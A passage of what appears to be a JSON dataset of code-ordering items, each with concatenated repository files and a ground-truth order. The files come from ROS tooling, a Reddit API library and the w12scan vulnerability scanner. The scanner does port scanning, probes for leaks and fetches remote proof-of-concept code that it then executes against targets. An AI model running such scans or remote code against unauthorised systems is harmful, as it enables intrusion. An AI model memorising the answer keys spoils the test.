       return False\n\n    if sibling_packages is None:\n        sibling_packages = get_sibling_packages(package)\n\n    existing_sub_packages = package.manifest.get_packages('run')\n    package.manifest.add_packages(set(), sibling_packages, prefer_depend_tag=False)\n\n    if package.manifest.format == 1:\n        pkg_type = 'run_depend'\n    else:\n        pkg_type = 'exec_depend'\n\n    package.manifest.remove_dependencies(pkg_type, existing_sub_packages - sibling_packages)\n\n\n    package.cmake.section_check([], 'catkin_metapackage', zero_okay=True)\n\n\n    if not package.manifest.is_metapackage():\n        export_tag = package.manifest.get_export_tag()\n        meta_tag = package.manifest.tree.createElement('metapackage')\n        package.manifest.insert_new_tag_inside_another(export_tag, meta_tag)\n\n\n@roscompile\ndef misc_xml_formatting(package):\n    package.manifest.changed = True\n    for config in package.plugin_configs:\n        config.changed = True\n\n\n@roscompile\ndef clean_up_rviz_configs(package):\n    for rviz_config in package.rviz_configs:\n        for config in rviz_config.get_class_dicts():\n            the_defaults = RVIZ_CLASS_DEFAULTS.get(config['Class'], {})\n            if dictionary_subtract(config, the_defaults):\n                rviz_config.changed = True\n\n\n            if config['Class'] == 'rviz_default_plugins/RobotModel':\n                for k, v in list(config.get('Links', {}).items()):\n                    if not isinstance(v, dict):\n                        continue\n                    if dictionary_subtract(config['Links'][k], ROBOT_MODEL_LINK_DEFAULTS):\n                        rviz_config.changed = True\n                        if not config['Links'][k]:\n                            del config['Links'][k]\n\n            if config['Class'] == 'rviz/Camera' and 'Visibility' in config:\n                visibility = config['Visibility']\n                for key in list(visibility.keys()):\n                    if visibility[key]:\n                        rviz_config.changed = True\n                        del visibility[key]\n                if not visibility:\n                    del config['Visibility']\n        if dictionary_subtract(rviz_config.contents, RVIZ_GLOBAL_DEFAULTS):\n            rviz_config.changed = True\n",
        "gt": [
            "'roscompile/ros_introspection/src/ros_introspection/cmake_parser.py'",
            "'roscompile/ros_introspection/src/ros_introspection/package.py'",
            "'roscompile/ros_introspection/src/ros_introspection/util.py'",
            "'roscompile/roscompile/src/roscompile/misc.py'"
        ]
    },
    {
        "files": [
            "'w12scan-client/lib/log.py'",
            "'w12scan-client/plugins/whatcms.py'",
            "'w12scan-client/main.py'",
            "'w12scan-client/thirdpart/ansistrm.py'",
            "'w12scan-client/lib/engine.py'",
            "'w12scan-client/lib/data.py'"
        ],
        "content": "'w12scan-client/lib/log.py'\n:\n\n\n\n\n\nimport logging\nimport threading\nfrom config import LOGGER_LEVEL\n\nfrom thirdpart.ansistrm import ColorizingStreamHandler\n\nDEBUG, INFO, WARN, ERROR, SUCCESS = range(1, 6)\nlogging.addLevelName(DEBUG, '^')\nlogging.addLevelName(INFO, '*')\nlogging.addLevelName(WARN, '!')\nlogging.addLevelName(ERROR, 'x')\nlogging.addLevelName(SUCCESS, '+')\n\nlogger = logging.getLogger(\"w12scan\")\n\nhandle = ColorizingStreamHandler()\nhandle.level_map[logging.getLevelName('^')] = (None, 'white', False)\nhandle.level_map[logging.getLevelName('*')] = (None, 'cyan', False)\nhandle.level_map[logging.getLevelName('+')] = (None, 'green', False)\nhandle.level_map[logging.getLevelName('x')] = (None, 'red', False)\nhandle.level_map[logging.getLevelName('!')] = (None, 'yellow', False)\n\nlogger.setLevel(LOGGER_LEVEL)\n\nformatter = logging.Formatter(fmt='%(asctime)s [%(levelname)s] %(message)s', datefmt='%Y/%m/%d %H:%M:%S')\nhandle.setFormatter(formatter)\nlogger.addHandler(handle)\n\n\nclass LOGGER:\n    def __init__(self):\n        self.lock = threading.Lock()\n\n    def info(self, msg):\n        self.lock.acquire()\n        logger.log(INFO, msg)\n        self.lock.release()\n\n    def warning(self, msg):\n        self.lock.acquire()\n        logger.log(WARN, msg)\n        self.lock.release()\n\n    def error(self, msg):\n        self.lock.acquire()\n        logger.log(ERROR, msg)\n        self.lock.release()\n\n    def success(self, msg):\n        self.lock.acquire()\n        logger.log(SUCCESS, msg)\n        self.lock.release()\n\n    def debug(self, msg):\n        self.lock.acquire()\n        logger.log(DEBUG, msg)\n        self.lock.release()\n\n'w12scan-client/plugins/whatcms.py'\n:\n\n\n\n\n\nimport hashlib\nimport json\nimport os\n\nimport requests\n\nfrom lib.data import collector, PATHS\n\n\ndef poc(domain):\n    cms = collector.get_domain_info(domain, \"CMS\")\n    if cms:\n        return False\n    data = read_config()\n    cache = {}\n\n    header = {\n        \"User-Agent\": \"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36\"}\n    for k, v in data.items():\n        for item in v:\n            path = item[\"path\"]\n            _url = domain + path\n            if path not in cache:\n                try:\n                    r = requests.head(_url, timeout=10, headers=header)\n                    if r.status_code != 200:\n                        continue\n                    hh = requests.get(_url, headers=header)\n                    if hh.status_code != 200:\n                        continue\n                    content = hh.content\n                    cache[path] = content\n                except:\n                    continue\n            else:\n                content = cache[path]\n            try:\n                html = content.decode('utf-8', 'ignore')\n            except:\n                html = str(content)\n            option = item[\"option\"]\n            vaild = item[\"content\"]\n            if option == \"md5\":\n                m = hashlib.md5()\n                m.update(content)\n                if m.hexdigest() == vaild:\n                    collector.add_domain_info(domain, {\"CMS\": k})\n                    return True\n            elif option == \"keyword\":\n                if vaild in html:\n                    collector.add_domain_info(domain, {\"CMS\": k})\n                    return True\n\n\ndef read_config():\n    path = os.path.join(PATHS.DATA_PATH, \"cms.json\")\n    with open(path) as f:\n        data = json.load(f)\n\n    return data\n\n'w12scan-client/main.py'\n:\n\n\n\n\nimport os\nimport random\nimport sys\nimport threading\nimport time\n\nfrom config import THREAD_NUM, DEBUG, NODE_NAME\nfrom lib.data import PATHS, logger\nfrom lib.engine import Schedular\nfrom lib.redis import redis_con\nfrom thirdpart.requests import patch_all\n\n\ndef module_path():\n\n    return os.path.dirname(os.path.realpath(__file__))\n\n\ndef main():\n    PATHS.ROOT_PATH = module_path()\n    PATHS.PLUGIN_PATH = os.path.join(PATHS.ROOT_PATH, \"pocs\")\n    PATHS.OUTPUT_PATH = os.path.join(PATHS.ROOT_PATH, \"output\")\n    PATHS.DATA_PATH = os.path.join(PATHS.ROOT_PATH, \"data\")\n\n    patch_all()\n    logger.info(\"Hello W12SCAN !\")\n\n\n\n\n    def redis_get():\n        list_name = \"w12scan_scanned\"\n        while 1:\n            target = redis_con.blpop(list_name)[1]\n            scheduler.put_target(target)\n\n\n\n    def debug_get():\n        target = \"http://stun.tuniu.com\"\n        scheduler.put_target(target)\n\n    def node_register():\n        first_blood = True\n        while 1:\n            if first_blood:\n                dd = {\n                    \"last_time\": time.time(),\n                    \"tasks\": 0,\n                    \"running\": 0,\n                    \"finished\": 0\n                }\n                redis_con.hmset(NODE_NAME, dd)\n                first_blood = False\n            else:\n                redis_con.hset(NODE_NAME, \"last_time\", time.time())\n            time.sleep(50 * 5)\n\n    scheduler = Schedular(threadnum=THREAD_NUM)\n    scheduler.start()\n\n    if DEBUG:\n        func_target = debug_get\n    else:\n        func_target = redis_get\n\n\n    node = threading.Thread(target=node_register)\n    node.start()\n\n\n    t = threading.Thread(target=func_target, name='LoopThread')\n    t.start()\n\n    try:\n        scheduler.run()\n    except KeyboardInterrupt:\n        logger.info(\"User exit\")\n\n\nif __name__ == '__main__':\n    main()\n\n'w12scan-client/thirdpart/ansistrm.py'\n:\n\n\n\n\n\n\n\nimport ctypes\nimport logging\nimport os\n\nfrom lib.redis import add_redis_log\n\n\nclass ColorizingStreamHandler(logging.StreamHandler):\n\n    color_map = {\n        'black': 0,\n        'red': 1,\n        'green': 2,\n        'yellow': 3,\n        'blue': 4,\n        'magenta': 5,\n        'cyan': 6,\n        'white': 7,\n    }\n\n\n    if os.name == 'nt':\n        level_map = {\n            logging.DEBUG: (None, 'blue', True),\n            logging.INFO: (None, 'white', False),\n            logging.WARNING: (None, 'yellow', True),\n            logging.ERROR: (None, 'red', True),\n            logging.CRITICAL: ('red', 'white', True),\n        }\n    else:\n        level_map = {\n            logging.DEBUG: (None, 'blue', False),\n            logging.INFO: (None, 'black', False),\n            logging.WARNING: (None, 'yellow', False),\n            logging.ERROR: (None, 'red', False),\n            logging.CRITICAL: ('red', 'white', True),\n        }\n    csi = '\\x1b['\n    reset = '\\x1b[0m'\n\n    @property\n    def is_tty(self):\n        isatty = getattr(self.stream, 'isatty', None)\n        return isatty and isatty()\n\n    def emit(self, record):\n        try:\n            message = self.format(record)\n            stream = self.stream\n            if not self.is_tty:\n                stream.write(message)\n            else:\n                self.output_colorized(message)\n            stream.write(getattr(self, 'terminator', '\\n'))\n            self.flush()\n        except (KeyboardInterrupt, SystemExit):\n            raise\n        except:\n            self.handleError(record)\n\n    if os.name != 'nt':\n        def output_colorized(self, message):\n            self.stream.write(message)\n    else:\n        import re\n        ansi_esc = re.compile(r'\\x1b\\[((?:\\d+)(?:;(?:\\d+))*)m')\n\n        nt_color_map = {\n            0: 0x00,\n            1: 0x04,\n            2: 0x02,\n            3: 0x06,\n            4: 0x01,\n            5: 0x05,\n            6: 0x03,\n            7: 0x07,\n        }\n\n        def output_colorized(self, message):\n            parts = self.ansi_esc.split(message)\n            write = self.stream.write\n            h = None\n            fd = getattr(self.stream, 'fileno', None)\n            if fd is not None:\n                fd = fd()\n                if fd in (1, 2):\n                    h = ctypes.windll.kernel32.GetStdHandle(-10 - fd)\n            while parts:\n                text = parts.pop(0)\n                if text:\n                    write(text)\n                if parts:\n                    params = parts.pop(0)\n                    if h is not None:\n                        params = [int(p) for p in params.split(';')]\n                        color = 0\n                        for p in params:\n                            if 40 <= p <= 47:\n                                color |= self.nt_color_map[p - 40] << 4\n                            elif 30 <= p <= 37:\n                                color |= self.nt_color_map[p - 30]\n                            elif p == 1:\n                                color |= 0x08\n                            elif p == 0:\n                                color = 0x07\n                            else:\n                                pass\n                        ctypes.windll.kernel32.SetConsoleTextAttribute(h, color)\n\n    def colorize(self, message, record):\n        if record.levelno in self.level_map:\n            bg, fg, bold = self.level_map[record.levelno]\n            params = []\n            if bg in self.color_map:\n                params.append(str(self.color_map[bg] + 40))\n            if fg in self.color_map:\n                params.append(str(self.color_map[fg] + 30))\n            if bold:\n                params.append('1')\n            if params:\n                message = ''.join((self.csi, ';'.join(params),\n                                   'm', message, self.reset))\n        return message\n\n    def format(self, record):\n        message = logging.StreamHandler.format(self, record)\n        add_redis_log(message)\n        if self.is_tty:\n\n            parts = message.split('\\n', 1)\n            parts[0] = self.colorize(parts[0], record)\n            message = '\\n'.join(parts)\n        return message\n\n\ndef main():\n    root = logging.getLogger()\n    root.setLevel(logging.DEBUG)\n    root.addHandler(ColorizingStreamHandler())\n    logging.debug('DEBUG')\n    logging.info('INFO')\n    logging.warning('WARNING')\n    logging.error('ERROR')\n    logging.critical('CRITICAL')\n\n\nif __name__ == '__main__':\n    main()\n\n'w12scan-client/lib/engine.py'\n:\n\n\n\n\n\nimport _thread\nimport os\nimport random\nimport socket\nimport sys\nimport threading\nimport time\nfrom concurrent import futures\nfrom queue import Queue\nfrom urllib.parse import urlparse\n\nimport requests\n\nfrom config import NUM_CACHE_DOMAIN, NUM_CACHE_IP, MASSCAN_DEFAULT_PORT, MASSCAN_FULL_SCAN, IS_START_PLUGINS\nfrom lib.common import is_ip_address_format, is_url_format\nfrom lib.data import logger, PATHS, collector\nfrom lib.loader import load_remote_poc, load_string_to_module\nfrom lib.redis import task_update\nfrom plugins import webeye, webtitle, crossdomain, gitleak, iis_parse, phpinfo, svnleak, tomcat_leak, whatcms, \\\n    ip_location, wappalyzer, directory_browse, password_found\nfrom plugins.masscan import masscan\nfrom plugins.nmap import nmapscan\n\n\nclass Schedular:\n\n    def __init__(self, threadnum=1):\n\n        self.queue = Queue()\n        self.ip_queue = Queue()\n        self.threadNum = threadnum\n        self.lock = threading.Lock()\n        self.cache_ips = []\n        self.cache_domains = []\n        logger.info(\"Start number of threading {}\".format(self.threadNum))\n\n    def put_target(self, target):\n\n        if is_ip_address_format(target):\n            serviceType = \"ip\"\n        elif is_url_format(target):\n            serviceType = \"domain\"\n            target = target.rstrip('/')\n        else:\n            serviceType = \"other\"\n\n        tmp = {\n            \"target\": target,\n            \"serviceType\": serviceType\n        }\n        if serviceType == \"ip\":\n            self.ip_queue.put(tmp)\n        else:\n            self.queue.put(tmp)\n        task_update(\"tasks\", self.queue.qsize() + self.ip_queue.qsize())\n\n    def receive_ip(self):\n        while 1:\n            struct = self.ip_queue.get()\n            serviceType = struct.get(\"serviceType\", 'other')\n            task_update(\"tasks\", self.queue.qsize() + self.ip_queue.qsize())\n            if serviceType == \"ip\":\n                flag = False\n                self.lock.acquire()\n                self.cache_ips.append(struct)\n                num = len(self.cache_ips)\n                if num >= NUM_CACHE_IP:\n                    flag = True\n                    serviceTypes = self.cache_ips\n                    self.cache_ips = []\n                self.lock.release()\n                if not flag:\n                    self.ip_queue.task_done()\n                    continue\n                task_update(\"running\", 1)\n                try:\n                    self.hand_ip(serviceTypes)\n                except Exception as e:\n                    logger.error(\"hand ip error:{}\".format(repr(e)))\n                    logger.error(repr(sys.exc_info()))\n                task_update(\"running\", -1)\n            self.ip_queue.task_done()\n            task_update(\"tasks\", self.queue.qsize() + self.ip_queue.qsize())\n\n    def receive(self):\n        while 1:\n            struct = self.queue.get()\n\n            task_update(\"tasks\", self.queue.qsize() + self.ip_queue.qsize())\n\n            serviceType = struct.get(\"serviceType\", 'other')\n            if serviceType == \"other\":\n                msg = \"not matches target:{}\".format(repr(struct))\n                logger.error(msg)\n                self.queue.task_done()\n                continue\n\n            elif serviceType == \"domain\":\n                flag = False\n                self.lock.acquire()\n                self.cache_domains.append(struct)\n                num = len(self.cache_domains)\n                if num >= NUM_CACHE_DOMAIN:\n                    flag = True\n                    serviceTypes = self.cache_domains\n                    self.cache_domains = []\n                self.lock.release()\n                if not flag:\n                    self.queue.task_done()\n                    continue\n\n                for serviceType in serviceTypes:\n                    task_update(\"running\", 1)\n                    try:\n                        self.hand_domain(serviceType)\n                    except Exception as e:\n                        logger.error(\"hand domain error:{}\".format(repr(e)))\n                        logger.error(repr(sys.exc_info()))\n                    task_update(\"running\", -1)\n            self.queue.task_done()\n            task_update(\"tasks\", self.queue.qsize() + self.ip_queue.qsize())\n\n    def start(self):\n        for i in range(self.threadNum - 1):\n            _thread.start_new_thread(self.receive, ())\n        _thread.start_new_thread(self.receive_ip, ())\n\n    def nmap_result_handle(self, result_nmap: dict, host):\n        if result_nmap is None:\n            return None\n        result2 = {}\n        for port, portInfo in result_nmap.items():\n            if host not in result2:\n                result2[host] = []\n            if portInfo[\"state\"] != \"open\":\n                continue\n            name = portInfo.get(\"name\", \"\")\n\n            product = portInfo.get(\"product\", \"\")\n            version = portInfo.get(\"version\", \"\")\n            extrainfo = portInfo.get(\"extrainfo\", \"\")\n            if \"http\" in name and \"https\" not in name:\n                if port == 443:\n                    _url = \"https://{0}:{1}\".format(host, port)\n                else:\n                    _url = \"http://{0}:{1}\".format(host, port)\n                self.put_target(_url)\n            elif \"https\" in name:\n                _url = \"https://{0}:{1}\".format(host, port)\n                self.put_target(_url)\n            result2[host].append(\n                {\"port\": port, \"name\": name, \"product\": product, \"version\": version, \"extrainfo\": extrainfo})\n        return result2\n\n    def hand_ip(self, serviceTypes, option='masscan'):\n        ip_list = []\n\n        for item in serviceTypes:\n            ip_list.append(item[\"target\"])\n        ports = MASSCAN_DEFAULT_PORT\n        result2 = {}\n        if option == 'masscan':\n            if MASSCAN_FULL_SCAN:\n                ports = \"1-65535\"\n            target = os.path.join(PATHS.OUTPUT_PATH, \"target_{0}.log\".format(time.time()))\n            with open(target, \"w+\") as fp:\n                fp.write('\\n'.join(ip_list))\n            logger.debug(\"ip:\" + repr(ip_list))\n            try:\n                result = masscan(target, ports)\n            except Exception as e:\n                logger.error(\"masscan error msg:{}\".format(repr(e)))\n                result = None\n            if result is None:\n                return None\n\n            for host, ports in result.items():\n                ports = list(ports)\n                if host not in result2:\n                    result2[host] = []\n                task_update(\"running\", 1)\n                try:\n                    result_nmap = nmapscan(host, ports)\n                except:\n                    result_nmap = None\n                task_update(\"running\", -1)\n                if result_nmap is None:\n                    for tmp_port in ports:\n                        result2[host].append({\"port\": tmp_port})\n                    continue\n                tmp_r = self.nmap_result_handle(result_nmap, host=host)\n                result2.update(tmp_r)\n        elif option == \"nmap\":\n            logger.debug(\"ip:\" + repr(ip_list))\n            for host in ip_list:\n                result_nmap = nmapscan(host, ports.split(\",\"))\n                tmp_r = self.nmap_result_handle(result_nmap, host=host)\n                if tmp_r:\n                    result2.update(tmp_r)\n\n        data = {}\n        for ip in result2.keys():\n\n            if ip not in data:\n                data[ip] = {}\n            d = ip_location.poc(ip)\n            if d:\n                data[ip][\"location\"] = d\n            data[ip][\"infos\"] = result2[ip]\n\n        collector.add_ips(data)\n        for ip in result2.keys():\n            collector.send_ok_ip(ip)\n\n    def hand_domain(self, serviceType):\n        target = serviceType[\"target\"]\n        logger.info(target)\n\n        collector.add_domain(target)\n\n        try:\n            r = requests.get(target, timeout=30, verify=False, allow_redirects=False)\n            collector.add_domain_info(target,\n                                      {\"headers\": r.headers, \"body\": r.text, \"status_code\": r.status_code})\n        except Exception as e:\n            logger.error(\"request url error:\" + str(e))\n            collector.del_domain(target)\n            return\n        logger.debug(\"target:{} over,start to scan\".format(target))\n\n\n        hostname = urlparse(target).netloc.split(\":\")[0]\n        if not is_ip_address_format(hostname):\n            try:\n                _ip = socket.gethostbyname(hostname)\n                collector.add_domain_info(target, {\"ip\": _ip})\n            except:\n                pass\n        else:\n            collector.add_domain_info(target, {\"ip\": hostname})\n\n        work_list = [webeye.poc, webtitle.poc, wappalyzer.poc, password_found.poc]\n\n        if IS_START_PLUGINS:\n            work_list.append(crossdomain.poc)\n            work_list.append(directory_browse.poc)\n            work_list.append(gitleak.poc)\n            work_list.append(iis_parse.poc)\n            work_list.append(phpinfo.poc)\n            work_list.append(svnleak.poc)\n            work_list.append(tomcat_leak.poc)\n            work_list.append(whatcms.poc)\n\n\n\n\n\n\n\n\n\n\n\n\n\n        for func in work_list:\n            try:\n                func(target)\n            except Exception as e:\n                logger.error(\"domain plugin threading error {}:{}\".format(repr(Exception), str(e)))\n\n        logger.debug(\"target:{} End of scan\".format(target))\n        infos = collector.get_domain(target)\n        _pocs = []\n        temp = {}\n        if IS_START_PLUGINS and \"CMS\" in infos:\n            if infos.get(\"app\"):\n                temp[\"app\"] = []\n                temp[\"app\"].append(infos[\"CMS\"])\n            else:\n                temp[\"app\"] = [infos[\"CMS\"]]\n\n            collector.add_domain_info(target, temp)\n\n        if temp.get(\"app\"):\n            keywords = temp[\"app\"]\n\n            pocs = load_remote_poc()\n\n            for poc in pocs:\n                for keyword in keywords:\n                    if poc[\"name\"] == keyword:\n                        webfile = poc[\"webfile\"]\n                        logger.debug(\"load {0} poc:{1} poc_time:{2}\".format(poc[\"type\"], webfile, poc[\"time\"]))\n\n                        code = requests.get(webfile).text\n                        obj = load_string_to_module(code, webfile)\n                        _pocs.append(obj)\n\n\n        if _pocs:\n            executor = futures.ThreadPoolExecutor(len(_pocs))\n            fs = []\n            for f in _pocs:\n                taks = executor.submit(f.poc, target)\n                fs.append(taks)\n            for f in futures.as_completed(fs):\n                try:\n                    res = f.result()\n                except Exception as e:\n                    res = None\n                    logger.error(\"load poc error:{} error:{}\".format(target, str(e)))\n                if res:\n                    name = res.get(\"name\") or \"scan_\" + str(time.time())\n                    collector.add_domain_bug(target, {name: res})\n\n        collector.send_ok(target)\n\n    def run(self):\n        while 1:\n\n            if self.cache_domains:\n                self.lock.acquire()\n                service_types = self.cache_domains\n                self.cache_domains = []\n                self.lock.release()\n\n\n                for serviceType in service_types:\n                    task_update(\"running\", 1)\n                    try:\n                        self.hand_domain(serviceType)\n                    except Exception as e:\n                        logger.error(repr(sys.exc_info()))\n                    task_update(\"running\", -1)\n\n\n            if self.cache_ips:\n                self.lock.acquire()\n                service_types = self.cache_ips\n                self.cache_ips = []\n                self.lock.release()\n\n                task_update(\"running\", 1)\n                try:\n                    self.hand_ip(service_types)\n                except Exception as e:\n                    logger.error(repr(sys.exc_info()))\n                task_update(\"running\", -1)\n\n\n            collector.submit()\n            task_update(\"tasks\", self.queue.qsize() + self.ip_queue.qsize())\n            time.sleep(random.randint(2, 10))\n\n'w12scan-client/lib/data.py'\n:\n\n\n\n\nfrom lib.collector import Collector\nfrom lib.log import LOGGER\n\nlogger = LOGGER()\n\n\nclass PATHS:\n    ROOT_PATH = ''\n    PLUGIN_PATH = ''\n    OUTPUT_PATH = ''\n    DATA_PATH = ''\n\n\ncollector = Collector()",
        "gt": [
            "'w12scan-client/thirdpart/ansistrm.py'",
            "'w12scan-client/lib/log.py'",
            "'w12scan-client/lib/data.py'",
            "'w12scan-client/plugins/whatcms.py'",
            "'w12scan-client/lib/engine.py'",
            "'w12scan-client/main.py'"
        ]
    },
    {
        "files": [
            "'aPRAW/apraw/models/reddit/submission.py'",
            "'aPRAW/apraw/models/reddit/more_comments.py'",
            "'aPRAW/apraw/models/reddit/listing.py'"
        ],
        "content": "'aPRAW/apraw/models/reddit/submission.py'\n:import re\nfrom enum import Enum\nfrom typing import TYPE_CHECKING, Dict, List, Any, Union\n\nfrom .redditor import Redditor\nfrom ..helpers.apraw_base import aPRAWBase\nfrom ..helpers.item_moderation import PostModeration\nfrom ..mixins.author import AuthorMixin\nfrom ..mixins.deletable import DeletableMixin\nfrom ..mixins.hideable import HideableMixin\nfrom ..mixins.nsfwable import NSFWableMixin\nfrom ..mixins.replyable import ReplyableMixin\nfrom ..mixins.savable import SavableMixin\nfrom ..mixins.spoilerable import SpoilerableMixin\nfrom ..mixins.subreddit import SubredditMixin\nfrom ..mixins.votable import VotableMixin\nfrom ...const import API_PATH\nfrom ...utils import prepend_kind\n\nif TYPE_CHECKING:\n    from ..subreddit.subreddit import Subreddit\n    from ...reddit import Reddit\n\nURL_PATTERN = re.compile(r\"/r(?:/(?P<subreddit>\\w+))/comments(?:/(?P<submission>\\w+))(?:/\\w+/(?P<comment>\\w+))?\")\n\n\nclass SubmissionKind(Enum):\n\n    LINK = \"link\"\n    SELF = \"self\"\n    IMAGE = \"image\"\n    VIDEO = \"video\"\n    VIDEOGIF = \"videogif\"\n\n\nclass Submission(aPRAWBase, DeletableMixin, HideableMixin, ReplyableMixin, NSFWableMixin, SavableMixin, VotableMixin,\n                 AuthorMixin, SubredditMixin, SpoilerableMixin):\n    \"\"\"\n    The model representing submissions.\n\n    Members\n    -------\n    reddit: Reddit\n        The :class:`~apraw.Reddit` instance with which requests are made.\n    data: Dict\n        The data obtained from the /about endpoint.\n    mod: SubmissionModeration\n        The :class:`~apraw.models.SubmissionModeration` instance to aid in moderating the submission.\n    kind: str\n        The item's kind / type.\n\n    **Typical Attributes**\n\n    This table describes attributes that typically belong to objects of this\n    class. Attributes are dynamically provided by the :class:`~apraw.models.aPRAWBase` class\n    and may vary depending on the status of the response and expected objects.\n\n    ================================= ============================================================================\n    Attribute                         Description\n    ================================= ============================================================================\n    ``all_awardings``                 A list of the awardings on the submission.\n    ``allow_live_comments``           Whether live comments have been enabled on this submission.\n    ``approved_at_utc``               The UTC timestamp of when the submission was approved.\n    ``approved_by``                   The user that approved the submission.\n    ``approved``                      Whether the submission has been approved by the moderators of the subreddit.\n    ``archived``                      Whether the submission has been archived by Reddit.\n    ``author_flair_background_color`` The submission author's flair background color.\n    ``author_flair_css_class``        The submission's author flair CSS class.\n    ``author_flair_richtext``         The submission's author flair text.\n    ``author_flair_template_id``      The submission author's flair template ID if applicable.\n    ``author_flair_text_color``       The submission's author flair text color if applicable.\n    ``author_flair_text``             The author's flair text if applicable.\n    ``author_flair_type``             The type of flair used by the submission's author.\n    ``author_fullname``               The author of the submission prepended with ``t2_``.\n    ``author_patreon_flair``          The submission's author Patreon flair.\n    ``author``                        The name of the submission's Redditor.\n    ``banned_at_utc``                 The UTC timestamp at which the author was banned.\n    ``banned_by``                     ``null``\n    ``can_gild``                      Whether the logged-in user can gild the submission.\n    ``can_mod_post``                  Whether the logged-in user can modify the post.\n    ``category``                      The submission's category.\n    ``clicked``                       Whether the submission has been clicked by the logged-in user previously.\n    ``content_categories``            The content categories assigned to the submission.\n    ``contest_mode``                  Whether the moderators of the subreddit have enabled contest mode on\n                                      the submission.\n    ``created_utc``                   The parsed UTC ``datetime`` on which the submission was made.\n    ``created``                       The timestamp of when the submission was posted.\n    ``discussion_type``               ``null``\n    ``distinguished``                 The type of distinguishment on the submission.\n    ``domain``                        The domain of the submission.\n    ``downs``                         The number of downvotes on the submission.\n    ``edited``                        Whether the submission has been edited by its author.\n    ``gilded``                        The number of awards this submission has received.\n    ``gildings``                      The gild awards the submission has received.\n    ``hidden``                        Whether the submission has been hidden by the logged-in user.\n    ``hide_score``                    Whether clients should hide the score from users.\n    ``id``                            The submission's ID.\n    ``ignore_reports``                Whether reports should be ignored on this submission.``\n    ``is_crosspostable``              Whether the submission can be crossposted to other subreddits.\n    ``is_meta``                       Whether the submission is a meta post.\n    ``is_original_content``           Whether the submission has been marked as original content.\n    ``is_reddit_media_domain``        Whether the media has been uploaded to Reddit.\n    ``is_robot_indexable``            Whether the submission can be indexed by robots.\n    ``is_self``                       Whether the submission is a self post.\n    ``is_video``                      Whether the submission is a video post.\n    ``likes``                         ``bool``\n    ``link_flair_background_color``   The submission's flair background color.\n    ``link_flair_css_class``          The CSS class applied on the submission's flair if applicable.\n    ``link_flair_richtext``           The submission's flair text if applicable.\n    ``link_flair_template_id``        The submission's flair template ID if applicable.\n    ``link_flair_text_color``         The submission's flair text color if applicable.\n    ``link_flair_text``               The submission's flair text.\n    ``link_flair_type``               The type of flair applied to the submission.\n    ``locked``                        Whether the submission has been locked by the subreddit moderators.\n    ``media_embed``                   ``Dict``\n    ``media_only``                    Whether the submission only consists of media.\n    ``media``                         ``null``\n    ``mod_note``                      Moderator notes added to the submission.\n    ``mod_reason_by``                 The moderator who added the removal reason if applicable.\n    ``mod_reason_title``              The reason the submission has been removed by moderators if applicable.\n    ``mod_reports``                   A list of moderator reports on the submission.\n    ``name``                          The ID of the submission prepended with ``t3_``.\n    ``no_follow``                     ``bool``\n    ``num_comments``                  The number of comments on the submission.\n    ``num_crossposts``                The number of times the submission has been crossposted.\n    ``num_reports``                   The number of reports on the submission.\n    ``over_18``                       Whether the submission has been marked as NSFW.\n    ``parent_whitelist_status``       ``null``\n    ``permalink``                     The submission's permalink.\n    ``pinned``                        Whether the submission has been pinned on the subreddit.\n    ``pwls``                          ``null``\n    ``quarantine``                    Whether the submission was posted in a quarantined subreddit.\n    ``removal_reason``                The submission's removal reason if applicable.\n    ``removed``                       Whether the submission has been removed by the subreddit moderators.\n    ``report_reasons``                A list of report reasons on the submission.\n    ``saved``                         Whether the submission has been saved by the logged-in user.\n    ``score``                         The overall submission vote score.\n    ``secure_media_embed``            ``Dict``\n    ``secure_media``                  ``null``\n    ``selftext_html``                 The submission text as HTML.\n    ``selftext``                      The submission's selftext.\n    ``send_replies``                  Whether the author of the submission will receive reply notifications.\n    ``spam``                          Whether the submission has been marked as spam.\n    ``spoiler``                       Whether the submission contains a spoiler.\n    ``stickied``                      Whether the submission is stickied on the subreddit.\n    ``subreddit_id``                  The subreddit's ID prepended with ``t5_``.\n    ``subreddit_name_prefixed``       The name of the subreddit the submission was posted on, prefixed with \"r/\".\n    ``subreddit_subscribers``         The number of subscribers to the submission's subreddit.\n    ``subreddit_type``                The type of the subreddit the submission was posted on\n                                      (public, restricted, private).\n    ``subreddit``                     The name of the subreddit on which the submission was posted.\n    ``suggested_sort``                The suggested sort method for comments.\n    ``thumbnail_height``              The height of the submission's thumbnail if applicable.\n    ``thumbnail_width``               The width of the submission's thumbnail if applicable.\n    ``thumbnail``                     A URL to the submission's thumbnail if applicable.\n    ``title``                         The submission's title.\n    ``total_awards_received``         The number of awards on the submission.\n    ``ups``                           The number of upvotes on the submission.\n    ``url``                           The full URL of the submission.\n    ``user_reports``                  A list of the user reports on the submission.\n    ``view_count``                    The number of views on the submission.\n    ``visited``                       Whether the logged-in user has visited the submission previously.\n    ``whitelist_status``              ``null``\n    ``wls``                           ``null``\n    ================================= ============================================================================\n\n    .. note::\n        Many of these attributes are only available if the logged-in user has moderator access to the item.\n\n\n        Create an instance of a submission object.\n\n        Parameters\n        ----------\n        reddit: Reddit\n            The :class:`~apraw.Reddit` instance with which requests are made.\n        data: Dict\n            The data obtained from the /about endpoint.\n        full_data: Dict\n            The full_data retrieved by the /r/{sub}/comments/{id} endpoint.\n        subreddit: Subreddit\n            The subreddit this submission was posted on.\n        author: Redditor\n            The author of this submission as a :class:`~apraw.models.Redditor`.\n\n        Fetch this item's information from a suitable API endpoint.\n\n        Returns\n        -------\n        self: Submission\n            The updated model.\n        \"\"\"\n        if (\"subreddit\" in self._data and \"id\" in self._data) or \"url\" in self._data:\n            if \"subreddit\" in self._data and \"id\" in self._data:\n                permalink = API_PATH[\"submission\"].format(sub=self._data[\"subreddit\"], id=self._data[\"id\"])\n            else:\n                match = URL_PATTERN.search(self._data[\"url\"])\n                permalink = API_PATH[\"submission\"].format(sub=match.group(\"subreddit\"), id=match.group(\"submission\"))\n            resp = await self._reddit.get(permalink)\n            self._update(resp)\n            return self\n        elif \"id\" in self._data:\n            resp = await self._reddit.get(API_PATH[\"info\"],\n                                          id=prepend_kind(self._data[\"id\"], self._reddit.link_kind))\n            self._update(resp[\"data\"][\"children\"][0][\"data\"])\n            return self\n        else:\n            raise ValueError(f\"No data available to make request URL: {self._data}\")\n\n    def _update(self, _data: Union[List, Dict[str, Any]]):\n\n        if isinstance(_data, (dict, list)):\n            data = _data if isinstance(_data, dict) else _data[0][\"data\"][\"children\"][0][\"data\"]\n            data[\"original_content\"] = data.get(\"is_original_content\", False)\n            